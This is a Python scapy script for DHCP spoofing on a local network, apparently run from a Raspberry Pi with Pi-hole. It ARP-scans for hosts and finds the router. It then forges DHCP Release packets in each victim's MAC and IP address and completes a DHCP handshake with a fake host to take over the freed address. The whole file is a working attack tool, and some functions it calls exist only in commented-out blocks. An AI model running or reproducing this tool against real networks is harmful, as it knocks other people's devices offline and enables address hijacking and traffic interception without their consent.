# dhcp.spoof.py
# Performs a targeted ARP Request scan to find existing hosts connected to network and "steal" their IP addresses
# 1. 
# 2. 
#### IMPORTS #### -------------------------------------------------------------------
import scapy.all as scapy
#import netifaces
#import ipaddress
import time
import json
import threading
import logging
from logging.handlers import TimedRotatingFileHandler
import random
from datetime import datetime
import subprocess
import queue
from common import *


#### CONFIG #### -------------------------------------------------------------------
iface = "eth0"  # Network interface to spoof
timeout_to_receive_arp_reply = 5 # Time to wait to receive ARP Reply (seconds)
timeout_to_receive_dhcp_response = 30 # seconds
time_to_wait_between_release_and_discover = 5 # seconds
#delay_between_arp_scans = 120  # seconds
json_file = "/home/pi/dhcp_starver/spoofed_hosts.json"
log_file = "/home/pi/dhcp_starver/logs/dhcp_spoof.log"


#### GLOBAL VARIABLES #### ---------------------------------------------------------
# Dict of all spoofed ip addresses k:IP, v:fake_host
spoofed_ip_dict = dict()

captured_packets = []

# DHCP Server's IP and MAC address
dhcp_server_ip = ""
dhcp_server_mac = ""

# Our own device's network parameters
our_ip_address = ""
our_mac_address = ""
our_netmask = ""
our_network = ""


# Define a semaphore for .log/.json file access without collision
file_semaphore = threading.Semaphore()

# Set up logging with rotation policy
handler = TimedRotatingFileHandler(log_file, when="midnight", interval=1, backupCount=7, encoding='utf-8', utc=True)
handler.suffix = "%Y-%m-%d"
handler.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)
logger = logging.getLogger()
logger.addHandler(handler)
logger.setLevel(logging.INFO)

# Set up scapy logger to error
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


#### FUNCTIONS #### ----------------------------------------------------------------
def write_to_log(message):
    """
    Write message to log file
    """
    with file_semaphore:
        logger.info(message)

'''
def load_from_json(file_path, semaphore):
    """
    Load json file contents to a dictionary
    """
    
    # Load json contents to a dictionary
    write_to_log(f"Loading results from {file_path}")

    try:
        with semaphore:
                with open(file_path, 'r') as file:
                    data = json.load(file)
        # Create a dict with fake_host objects
        file_dict = {}
        for ip, host_data in data.items():
            file_dict[ip] = fake_host.from_dict(host_data)
        

    # Return an empty dict if something goes wrong
    except FileNotFoundError:
        write_to_log(f"File not found: {json_file}")
        file_dict = {}
    except json.JSONDecodeError as e:
        write_to_log(f"Error decoding JSON file: {e}")
        file_dict = {}
    except Exception as e:
        write_to_log(f"Unknown error during file read: {e}")
        file_dict = {}

    return file_dict
    '''
'''
OLD
def load_from_json(file_path):
    """
    Load JSON file contents to a dictionary.
    Raises exceptions to be handled by the caller.
    """
    try:
        with file_semaphore:
            with open(file_path, 'r') as file:
                data = json.load(file)
        
        file_dict = {ip: fake_host.from_dict(host_data) for ip, host_data in data.items()}
        return file_dict

    except FileNotFoundError as e:
        raise FileNotFoundError(f"File not found: {file_path}") from e
    except json.JSONDecodeError as e:
        raise json.JSONDecodeError(f"Error decoding JSON file: {e}", e.doc, e.pos)
    except Exception as e:
        raise Exception(f"Unknown error during file read: {e}") from e
'''
'''
OLD
def save_to_json(results, file_path):
    """
    Save a dictionary to a json file. If results is an empty dictionary, flush json file
    """

    # If results is an empty dictionary, flush json file
    if not results:
        with open(file_path, 'w') as file:
            pass  
    serializable_dict = {ip: host.to_dict() for ip, host in results.items()}

    # Sort the dictionary by IP address
    sorted_dict = dict(sorted(serializable_dict.items(), key=lambda item: ipaddress.ip_address(item[0])))

    # Save the sorted dictionary to a file
    with file_semaphore:
        with open(file_path, 'w') as file:
            json.dump(sorted_dict, file, indent=4)

    write_to_log(f"Results saved in {file_path}")
'''
'''
def save_to_json(results, file_path, semaphore):
    """
    Save a dictionary to a json file. If results is an empty dictionary, flush json file
    """

    # If results is an empty dictionary, flush json file
    if not results:
        with open(file_path, 'w') as file:
            pass  
    serializable_dict = {ip: host.to_dict() for ip, host in results.items()}

    # Sort the dictionary by IP address
    sorted_dict = dict(sorted(serializable_dict.items(), key=lambda item: ipaddress.ip_address(item[0])))

    # Save the sorted dictionary to a file
    try:
        with semaphore:
            with open(file_path, 'w') as file:
                json.dump(sorted_dict, file, indent=4)
    except Exception as e:
        raise Exception(f"Error saving JSON file: {e}") from e
    #write_to_log(f"Results saved in {file_path}")
'''
'''
def update_json_file(updated_ip_dict, file_path):
        """
        Update json file with new information. Load + Update + Save
        """
        # Load previous results from json file
        dict_on_file = load_from_json(file_path)

        # Update previous results with new hosts' information
        for ip, host in updated_ip_dict.items():
            dict_on_file[ip] = host

        save_to_json(dict_on_file, file_path)
'''

def update_json_file(updated_ip_dict, file_path):
        """
        Update json file with new information.
        Load specified file into a dictionary, adds new entries and save it to JSON file.
        """
        try:
            # Load previous results from JSON file
            dict_on_file = load_from_json(file_path, file_semaphore)

            # Update previous results with new hosts' information
            for ip, host in updated_ip_dict.items():
                dict_on_file[ip] = host
            # Save updated results back to the JSON file
            save_to_json(dict_on_file, file_path, file_semaphore)
        except FileNotFoundError as e:
            write_to_log(str(e))
        except json.JSONDecodeError as e:
            write_to_log(f"Error decoding JSON file: {str(e)}")
        except Exception as e:
            write_to_log(f"An unexpected error occurred: {str(e)}")

        
def get_unspoofed_ips(network_ip_addresses):
    """
    Compares avalaible ip addresses with spoofed ips to return a list with non spoofed IP addresses
    """
    try:
        # Iterating for every fake_host in the dictionary
        for ip, host in spoofed_ip_dict.items():
            '''
            # Check if host is spoofed or is DHCP server
            if host.is_spoofed or host.is_server:
            '''
            # Check if host is spoofed or is DHCP server
            if host.is_spoofed:
                # Remove IP address from all IP addresses list
                network_ip_addresses.remove(ip)
        return network_ip_addresses
    except:
        # If an error occurs, return the whole address list
        return network_ip_addresses


def create_dhcp_discover_packet(host):
    """
    Creates a broadcast DHCP Discover with host's parameters
    """
    mac_address = host.mac_address
    # Converting MAC address from typical format to a 16 bytes sequence, needed for BOOTP/DHCP header 
    host_mac = int(mac_address.replace(":", ""), 16).to_bytes(6, "big")
    # Making DHCP Discover packet
    ether_header = scapy.Ether(src=host_mac, 
                               dst="ff:ff:ff:ff:ff:ff")
    ip_header = scapy.IP(src="0.0.0.0", 
                         dst="255.255.255.255")
    udp_header = scapy.UDP(sport=68, 
                           dport=67)
    bootp_field = scapy.BOOTP(chaddr=host_mac, 
                              xid=host.transaction_id,
                              flags=0) # Unicast
                              #flags=0x8000) # Broadcast
    dhcp_field = scapy.DHCP(options=[("message-type", "discover"),
                                     ("client_id", b'\x01' + host_mac),
                                     ('param_req_list', [53, 54, 51, 1, 6, 3, 50]),  
                                     ("hostname", host.hostname), 
                                     "end"])
    dhcp_discover = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)

    return dhcp_discover

'''
def sniff_dhcp_packet(queue):
    """
    Sniffs an incoming DHCP packet and puts it in the queue
    """
    captured_packets = scapy.sniff(iface=iface, filter="udp and (port 67 or 68)", count=1, timeout=timeout_to_receive_dhcp_response)
    if captured_packets:
        queue.put(captured_packets[0])
    else:
        queue.put(None)
    #return captured_packets[0] if captured_packets else None
'''

def release_and_catch(existing_host_mac, existing_host_ip):
    """
    Release device's IP address and try to assign it to a new host
    """
    # Send DHCP Release to force a new IP address adquisition by the host
    send_release(existing_host_mac, existing_host_ip, time_to_wait_between_release_and_discover)
    
    # Create a new bogus host
    host = fake_host.create_host()
    # Create new DHCP Discover packet
    dhcp_discover_packet = create_dhcp_discover_packet(host)

    # Send DHCP Discover
    scapy.sendp(dhcp_discover_packet, verbose=False, iface=iface)
    write_to_log(f"DHCP Discover sent: {host.mac_address} requesting a new IP address")

    # Waits until timeout or DHCP Response is received
    dhcp_discover_response = process_dhcp_packet(dhcp_discover_packet[scapy.BOOTP].xid, timeout_to_receive_dhcp_response)

    if dhcp_discover_response:

        # Update hosts parameters, like a new assigned IP address
        print(f"{dhcp_discover_response.summary()}")
        response_type = handle_dhcp_response(dhcp_discover_response, host)

        if response_type == "OFFER":
            #print(f"Offer received")
            write_to_log(f"DHCP Offer received: {host.mac_address} offered {host.ip_address}")
            continue_with_dora_handshake(host)
        elif response_type == "ACK":
            # ACK in this stage is not expected, but just in case 
            print(f"ACK received")
        elif response_type == "NAK":
            #print(f"NAK received")
            write_to_log(f"NAK received: Failed to obtain an IP address for that host")
        else:
            print(f"Unknown DHCP response received: DHCP.MessageType = {dhcp_discover_packet[scapy.DHCP].options[0][1]}")
            return

    else:
        # If no response is received
        print("Timeout reached without receiving a valid DHCP Discover response.")
        return
    




def continue_with_dora_handshake(host):
    """

    """
    
    # If Discover-Offer occurs, continue with DORA handshake
    dhcp_request_packet = create_broadcast_dhcp_request_packet(host)
    # Send DHCP Request
    scapy.sendp(dhcp_request_packet, verbose=False, iface=iface)
    write_to_log(f"DHCP Request sent: {host.mac_address} requesting {host.ip_address}")

    # Waits until timeout or DHCP Response is received
    dhcp_request_response = process_dhcp_packet(dhcp_request_packet[scapy.BOOTP].xid, timeout_to_receive_dhcp_response)

    if dhcp_request_response:
        
        print(f"{dhcp_request_response.summary()}")
        response_type = handle_dhcp_response(dhcp_request_response, host)

        if response_type == "ACK":
            # DORA handshake completed, saving new host to json file
            write_to_log(f"ACK received: {host.mac_address} successfuly linked to {host.ip_address}")
            host_dict = {}
            host_dict[host.ip_address] = host
            update_json_file(host_dict, json_file)

        else:
            print(f"Unknown DHCP response received: DHCP.MessageType = {dhcp_request_packet[scapy.DHCP].options[0][1]}")
            return


def process_dhcp_packet(transaction_id, timeout):
    """
    Periodically checks for a DHCP packet matching the transaction.
    """
    start_time = time.time()
    while time.time() - start_time < timeout:

        for pkt in captured_packets:

            # Check if packet if DHCP and it's transaction id matches our current transaction
            if scapy.DHCP in pkt:

                if pkt[scapy.BOOTP].xid == transaction_id:

                    captured_packets.remove(pkt)
                    return pkt
                
                # If an foreign ACK is received, it's interesting to know who gets what ip address
                elif pkt[scapy.DHCP].options[0][1] == 5:

                    host_mac = mac_to_str(pkt[scapy.BOOTP].chaddr)
                    host_ip = pkt[scapy.BOOTP].yiaddr
                    write_to_log(f"Received unknown DHCP ACK: {host_ip} linked to {host_mac}")
                    captured_packets.remove(pkt)
            
        time.sleep(1)

    return None


def send_release(host_mac, ip_address, delay):
    """
    Send DHCP Release
    """
    # Getting a random Trans ID
    trans_id = random.getrandbits(32)
    # Converting MAC addresses
    mac_address = int(host_mac.replace(":", ""), 16).to_bytes(6, "big")
    server_mac = int(dhcp_server_mac.replace(":", ""), 16).to_bytes(6, "big")
    # Making DHCP Release packet
    ether_header = scapy.Ether(src=mac_address, 
                               dst=server_mac)
    ip_header = scapy.IP(src=ip_address, 
                         dst=dhcp_server_ip)
    udp_header = scapy.UDP(sport=68, 
                           dport=67)
    bootp_field = scapy.BOOTP(chaddr=mac_address,
                              ciaddr=ip_address,
                              xid=trans_id,
                              flags=0)
    dhcp_field = scapy.DHCP(options=[("message-type", "release"),
                                     ("server_id", dhcp_server_ip),
                                     "end"])
    dhcp_request = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)

    scapy.sendp(dhcp_request, verbose=False, iface=iface)
    write_to_log(f"Releasing IP address {ip_address} from {host_mac}")
    # Wait for t seconds to try to catch that released IP address
    time.sleep(delay)


def send_gratuitous_arp(host_mac, host_ip):
    """
    Send an ARP Request announcing defined IP-MAC association
    """
    # Create a broadcast ARP Request
    ether_header = scapy.Ether(src=host_mac, 
                               dst="ff:ff:ff:ff:ff:ff")
    arp_header = scapy.ARP(op=2, # 1=Request, 2=Reply 
                           pdst=host_ip, 
                           psrc=host_ip, 
                           hwsrc=host_mac)
    arp_request = ether_header/arp_header
    # Send 3 Gratuitous ARPs trying to force an IP renewal on the connected device
    for _ in range(3):
        scapy.sendp(arp_request, verbose=False, iface=iface)
    write_to_log(f"Sending Gratuitous ARP announcing {host_mac} - {host_ip}")


def arp_scan(target_ips):
    """
    Performs a targeted ARP request scan to find existing hosts on the network.
    Returns a list with hosts' (IP, MAC) tuples who have answered
    """
    # ARP Request packet, one for every unspoofed ip address
    arp_requests = [scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip) for ip in target_ips]
    # Send it and catch ARP Reply response(s)
    result, _ = scapy.srp(arp_requests, timeout=timeout_to_receive_arp_reply, verbose=False)

    # List to save hosts' (IP, MAC) tuples who have answered
    responsive_devices = []
    # For every response, checks if it's an ARP response and saves the responding host params
    for _ , received in result:
        if received.haslayer(scapy.ARP):
            arp_layer = received[scapy.ARP]
            # Checking if it's Reply
            if arp_layer.op == 2:
                ip_address = received.psrc
                mac_address = received.hwsrc.lower()
                responsive_devices.append((ip_address, mac_address.lower()))
    
    # Checks if someone of this hosts is the router/DHCP server
    for (ip, mac) in responsive_devices:
        is_router = check_if_router(ip)
        if is_router:
            write_to_log(f"Found router/DHCP server - MAC:{mac}, IP:{ip}")
            global dhcp_server_ip, dhcp_server_mac
            dhcp_server_ip = ip
            dhcp_server_mac = mac
            # Removing router from responsive devices list
            responsive_devices.remove((ip,mac))
            break
    
    return responsive_devices
  

def get_dhcp_leases():
    """
    Reads /etc/pihole/dhcp.leases and loads its content to a dictionary
    That file contains PiHole's DHCP Server leased IP addresses and some information about every host
    """
    dhcp_leases = {}
    with open("/etc/pihole/dhcp.leases", 'r') as f:
        for line in f:
            parts = line.strip().split()
            if len(parts) >= 5:
                #timestamp = parts[0]
                mac_address = parts[1]
                ip_address = parts[2]
                hostname = parts[3]
                #if len(parts) > 4:
                #    hostname += " " + " ".join(parts[4:])
                #dhcp_leases[mac_address] = {'timestamp': timestamp, 'ip_address': ip_address, 'hostname': hostname}
                dhcp_leases[mac_address] = {'ip_address': ip_address, 'hostname': hostname}
    return dhcp_leases



def check_if_router(ip_address):
    """
    Check if that IP address belongs to home network's router/DHCP server
    """
    try:
        # Execute the 'ip route' command
        route_output = subprocess.check_output(['/usr/sbin/ip', 'route', 'get', '8.8.8.8'], text=True)
        return ip_address in route_output
    except subprocess.CalledProcessError:
        return False
    

def main():

    write_to_log(f"Starting DHCP spoofing proccess")
    # Get network interface assigned IP address and network network mask
    global our_ip_address, our_netmask
    our_ip_address, _, our_netmask, _ = get_network_params(iface)
    
    # Getting all host avalaible IP addresses for network
    network_ip_addresses = get_hosts_from_network(our_ip_address, our_netmask)

    # Load previous spoofed hosts from json file
    global spoofed_ip_dict
    spoofed_ip_dict = load_from_json(json_file, file_semaphore)

    # Get a list with non spoofed host's IP addresses checking spoofed_ip_dict
    target_ips = get_unspoofed_ips(network_ip_addresses)
    # Perform an ARP scan
    ip_mac_data = arp_scan(target_ips)
    # Prints found devices on network
    if ip_mac_data:
        write_to_log(f"Found connected and unspoofed device(s):")
        for ip, mac in ip_mac_data:
            write_to_log(f"MAC:{mac} - IP:{ip}")
    else:
        write_to_log(f"No other devices found")
        write_to_log(f"Service Terminated")
        exit()
    # Getting Pi-hole DHCP Server's IP lease list
    spoofed_hosts = get_dhcp_leases()

    #packet_queue = queue.Queue() # FIFO by default
    # Create DHCP packets capture thread
    #dhcp_capture_thread = threading.Thread(target=sniff_dhcp_packet, args=(packet_queue,))
    #dhcp_sniffer = scapy.AsyncSniffer(filter="udp and (port 67 or 68)", prn=handle_dhcp_packet)

    # Start response DHCP packet capture thread
    capture_thread = threading.Thread(target=capture_dhcp_packets, args=(captured_packets, iface))
    capture_thread.daemon = True
    capture_thread.start()

    for ip, mac in ip_mac_data:
        # Checking if discovered host is not already spoofed nor router/DHCP Server
        if mac not in spoofed_hosts.keys() and ip != dhcp_server_ip:
            #write_to_log(f"ARP Scan: Found non-spoofed host {ip} - {mac}")
            # Try to release that host IP address and kidnap it
            release_and_catch(mac, ip)
    
    write_to_log(f"Service Terminated")
    
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt as e:
        write_to_log(f"Service terminated")